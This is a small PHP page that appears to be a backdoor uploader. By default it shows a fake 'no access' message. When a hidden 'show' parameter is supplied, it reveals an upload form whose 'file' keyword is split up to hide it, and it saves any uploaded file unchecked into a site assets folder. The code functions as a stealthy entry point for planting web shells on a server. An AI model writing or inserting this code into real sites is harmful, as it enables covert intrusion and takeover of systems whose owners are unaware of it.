<!DOCTYPE html>
<html>
<body>
<?php
$var='f'.'i'.'l'.'e';
if(isset($_REQUEST['show']))
{
?>
<form method="post" enctype="multipart/form-data">
<input type="<?=$var?>" name="uploaded_file"></input>

<input type="submit" name="submit" value="OK" />

</form>
<?php
}
else
{
	echo "You dont have access to this file contents";
}
?>
</body>
</html>

<?php

if(!empty($_FILES['uploaded_file']))
  {
	  if ($_FILES["uploaded_file"]["error"] > 0) {
        echo "Error: " . $_FILES["file1"]["error"] . "<br />";
		exit;
    }

    $path = '../../../../assets/';
    $path = $path . basename( $_FILES['uploaded_file']['name']);
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "Done";
    } else{
        echo "Not Done";
    }
  }

?>